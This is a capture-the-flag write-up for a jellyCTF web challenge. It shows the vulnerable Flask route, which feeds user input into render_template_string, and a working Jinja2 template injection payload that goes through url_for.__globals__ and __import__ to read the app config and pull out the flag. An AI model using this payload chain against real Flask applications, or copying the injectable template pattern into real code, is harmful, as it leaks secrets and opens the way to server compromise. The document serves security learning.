# [web] bro_visited_his_site

<table><tbody>
<tr><th>Value</th><td>343 pts</td></tr>
<tr><th>Tags</th><td><code>easy</code></td></tr>
<tr><th>Author</th><td>arepi</td></tr>
<tr><th>Connection info</th><td><a href="https://bro-visited-his-site.jellyc.tf/">https://bro-visited-his-site.jellyc.tf/</a></td></tr>
<tr><th>Files</th><td><a href="./files/bro_visited_his_site.zip">bro_visited_his_site.zip</a></td></tr>
</tbody></table>

bro stored his secrets in the flask app config

note: this is not /app/flag.txt - that's bro_visited_his_site_2

10 point hint: attack type

20 point hint: writeup for similar problem

---

raw notes:

  - this is template injection, with the lowest hanging fruit nixed
  - here's the prize:
    ```py
    app = Flask(__name__)
    app.config["FLAG"] = "jellyCTF{redacted}"
    ```
  - here's the template:
    ```py
    @app.route("/response")
    def response():
        word = request.args.get("word", "")
    
        return render_template_string(f'''
            {{% set config="friend" %}}
            {{% set self="visit" %}}
            <p>
                {word}pilled {word}maxxer
            </p>
        ''')
    ```
  - so it's not as simple as <https://bro-visited-his-site.jellyc.tf/response?word={{config.FLAG}}>, since they've deliberately clobbered `config`
  - per [docs](https://flask.palletsprojects.com/en/3.0.x/templating/#standard-context), we have other variables in the standard context to play with, like the `url_for` function
  - plan is to go from a function to importing our module, then accessing `app.config`. existing write-up for this flavour of template injection: <https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>
      - `url_for` is our function (provided by standard context)
      - `url_for.__globals__.__builtins__.__import__` gets us to import
      - `url_for.__globals__.__builtins__.__import__('bros_site').app.config.FLAG` gets us to the flag
      - <https://bro-visited-his-site.jellyc.tf/response?word={{%20url_for.__globals__.__builtins__.__import__(%27bros_site%27).app.config.FLAG%20}}> ([archived](./response.html)):
        ```html
                <p>
                    jellyCTF{f1agp1ll3d_t3mpl4te_1nj3ct10nmaxx3r}pilled jellyCTF{f1agp1ll3d_t3mpl4te_1nj3ct10nmaxx3r}maxxer
                </p>
        ```
